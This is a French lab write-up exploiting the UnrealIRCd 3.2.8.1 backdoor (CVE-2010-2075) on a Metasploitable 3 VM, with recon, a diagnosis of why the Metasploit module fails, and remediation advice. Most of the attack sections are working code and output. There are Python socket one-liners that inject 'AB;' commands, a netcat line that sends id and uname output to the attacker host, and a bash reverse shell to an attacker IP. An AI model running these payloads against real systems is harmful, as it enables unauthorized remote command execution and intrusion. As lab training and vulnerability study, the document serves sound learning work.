# Write-up — UnrealIRCd 3.2.8.1 : Backdoor Command Execution (Metasploitable 3, port 6697)

Cible : `172.28.128.3:6697` (IRC, variante SSL côté port — pas réellement TLS, voir plus bas)
· CVE-2010-2075 · Résultat : exécution de commande confirmée (utilisateur `boba_fett`), **mais
uniquement à la main** — le module Metasploit lui-même échoue systématiquement dans ce labo,
cause identifiée précisément.

Tout ce qui suit est copier-coller direct (testé en zsh), côté 🖥 Kali uniquement.

---

## 1. Recon

```bash
nmap -sC -sV -p 6697 172.28.128.3
```
```
6697/tcp open  irc     UnrealIRCd
Service Info: Host: irc.TestIRC.net
```
Le port 6697 est conventionnellement un port IRC-over-TLS, mais un test explicite montre que
ce n'est pas réellement du TLS ici :
```bash
openssl s_client -connect 172.28.128.3:6697
```
```
...wrong version number...
```
Erreur typique d'un serveur qui ne parle **pas** SSL/TLS sur ce port malgré le numéro
conventionnel. Confirmation en clair :
```bash
timeout 5 bash -c 'exec 3<>/dev/tcp/172.28.128.3/6697; cat <&3' | head -3
```
```
:irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
```
Réponse IRC en clair immédiate — c'est bien du texte brut, pas du TLS. Un scan complémentaire
confirme que 6667/6668 (ports IRC standards) sont filtrés sur cette VM : seul 6697 est ouvert.

## 2. Méthode d'identification de la CVE et du module

```bash
searchsploit unrealircd
```
```
UnrealIRCd 3.2.8.1 - Backdoor Command Execution | linux/remote/16922.rb
```
```bash
msfconsole -q -x "search unreal; exit"
```
```
exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12  excellent  Yes  UnrealIRCD 3.2.8.1 Backdoor Command Execution
```
```bash
msfconsole -q -x "info exploit/unix/irc/unreal_ircd_3281_backdoor; exit"
```
```
Privileged: No
References: CVE-2010-2075, OSVDB-65445
```
**CVE-2010-2075.** Entre novembre 2009 et juin 2010, l'archive officielle de téléchargement
`Unreal3.2.8.1.tar.gz` a été compromise sur les miroirs : une porte dérobée a été insérée
directement dans le code source distribué (pas une faille applicative classique, un vrai
cas de **supply chain compromise** historique). Le code modifié intercepte les données reçues
sur la socket IRC *avant* tout traitement du protocole : si une ligne reçue commence par la
chaîne magique `AB;`, le reste de la ligne est passé directement à `system()` côté serveur,
sans jamais être interprété comme une commande IRC. Aucune authentification, aucun
enregistrement NICK/USER requis.

## 3. Tentative manuelle — premier essai, incomplet

```bash
python3 -c "
import socket, time
s = socket.create_connection(('172.28.128.3', 6697), timeout=10)
s.sendall(b'AB;id\n')
time.sleep(3)
print(s.recv(65536))
"
```
Ce premier essai ne montre qu'une partie du MOTD du serveur, pas de résultat de commande
visible — fermeture de la socket trop rapide. Hypothèse à vérifier : le serveur a besoin de
plus de temps avant de traiter la donnée injectée.

## 4. Metasploit — échec systématique, cause identifiée

```bash
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 172.28.128.3; set RPORT 6697; set PAYLOAD cmd/unix/reverse_bash; set LHOST 172.28.128.1; set LPORT 4470; exploit -z; sleep 35; sessions -l; exit -y"
```
```
[+] 172.28.128.3:6697 - The target appears to be vulnerable. UnrealIRCd detected after registration
[*] 172.28.128.3:6697 - Sending IRC backdoor command
[*] Exploit completed, but no session was created.

Active sessions
===============
No active sessions.
```
Testé aussi avec `set AutoCheck false` (pour écarter une collision entre la connexion de
`check()` et celle d'`exploit()` côté anti-flood IRC) — même échec. Testé avec 4 payloads
différents (`cmd/linux/http/x86/meterpreter/reverse_tcp` par défaut, `cmd/unix/reverse_perl`,
`cmd/unix/reverse`, `cmd/unix/reverse_bash`) — même échec dans tous les cas.

**Diagnostic via le code source du module**
(`/usr/share/metasploit-framework/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb`) :
```ruby
'DefaultOptions' => { 'wfsDelay' => 30 }
...
def exploit
  connect
  sock.put("AB;" + payload.encoded + "\n")
  disconnect   # <-- fermeture immédiate, sans aucune pause
end
```
`wfsDelay => 30` ne fait qu'allonger la fenêtre pendant laquelle le Framework attend
qu'une session apparaisse **après** la fin de `exploit()` — ça ne retarde en rien la
fermeture de la socket à l'intérieur de la méthode elle-même, qui a lieu tout de suite après
l'envoi.

## 5. Reproduction manuelle — cause confirmée, accès obtenu

En gardant la connexion active sur le serveur pendant le temps qu'il lui faut pour traiter la
donnée reçue (le `NOTICE AUTH :*** Looking up your hostname...` montre qu'une résolution DNS
inverse bloquante a lieu avant que le serveur ne reprenne la lecture du buffer) :

```bash
python3 -c "
import socket, time
s = socket.create_connection(('172.28.128.3', 6697), timeout=10)
s.sendall(b'AB;echo PWNED_DELAY_TEST | nc 172.28.128.1 4463\n')
time.sleep(35)
s.close()
"
```
Avec un `nc -lvnp 4463` en écoute côté Kali :
```
connect to [172.28.128.1] from (UNKNOWN) [172.28.128.3] 34074
PWNED_DELAY_TEST
```
**La commande s'exécute bien** — il fallait seulement laisser la socket ouverte ~30-35
secondes avant de la fermer, le temps que le serveur sorte de sa résolution DNS bloquante et
traite enfin le buffer contenant `AB;...`. C'est exactement la durée que suggère le
`wfsDelay => 30` du module — sauf que le module l'applique au mauvais endroit (après
`disconnect`, pas avant).

Confirmation avec la preuve d'identité :
```bash
python3 -c "
import socket, time
s = socket.create_connection(('172.28.128.3', 6697), timeout=10)
s.sendall(b'AB;(id; uname -a; whoami) | nc 172.28.128.1 4464\n')
time.sleep(35)
s.close()
"
```
```
uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
Linux metasploitable3-ub1404 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 GNU/Linux
boba_fett
```
Et un shell interactif complet, en rejouant exactement le payload que Metasploit aurait dû
envoyer (`cmd/unix/reverse_bash`) :
```bash
python3 -c "
import socket, time
s = socket.create_connection(('172.28.128.3', 6697), timeout=10)
s.sendall(b\"AB;bash -c 'bash -i >& /dev/tcp/172.28.128.1/4472 0>&1'\n\")
time.sleep(35)
s.close()
"
```
```
connect to [172.28.128.1] from (UNKNOWN) [172.28.128.3] 36504
bash: cannot set terminal process group (1647): Inappropriate ioctl for device
bash: no job control in this shell
boba_fett@metasploitable3-ub1404:/opt/unrealircd/Unreal3.2$
```

## 6. Preuve d'accès obtenu

Shell interactif `boba_fett` via le payload exact de Metasploit (`cmd/unix/reverse_bash`),
exécuté à la main en maintenant la socket ouverte le temps nécessaire. Accès non privilégié
(`'Privileged' => false` dans le module — cohérent, UnrealIRCd ne tourne pas en root sur
cette install). Intéressant pour une suite : `boba_fett` est dans le groupe `docker`, piste de
post-exploitation non explorée ici (hors scope de ce service).

---

## Remédiation

- Ne jamais utiliser une archive téléchargée sans vérifier son hash/signature contre une
  source de confiance — c'est exactement ce contrôle qui aurait détecté le tarball compromis
  entre 2009 et 2010.
- Mettre à jour UnrealIRCd vers une version post-2010, toutes compilées depuis du code propre.
- Surveiller les sommes de contrôle officielles des paquets tiers avant déploiement en
  production, pas seulement pour IRC.

---

**Point méthodologique.** Ce service illustre l'inverse du cas Drupal/Samba sur cette même
VM : ici, la vulnérabilité **est** exploitable, l'exploitation **manuelle** fonctionne
parfaitement, mais c'est le **module Metasploit lui-même** qui échoue dans cet environnement
— parce qu'il ferme sa connexion immédiatement après l'envoi de la charge, alors que ce labo a
besoin d'environ 30 secondes de connexion maintenue (résolution DNS inverse bloquante côté
serveur) avant que la donnée injectée soit réellement traitée.

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis les
étapes 1 à 5 dans l'ordre, en gardant toujours la socket ouverte ≥30s après l'envoi de `AB;`.

**Suite du parcours MS3 :** WEBrick Ruby custom (port 3500).
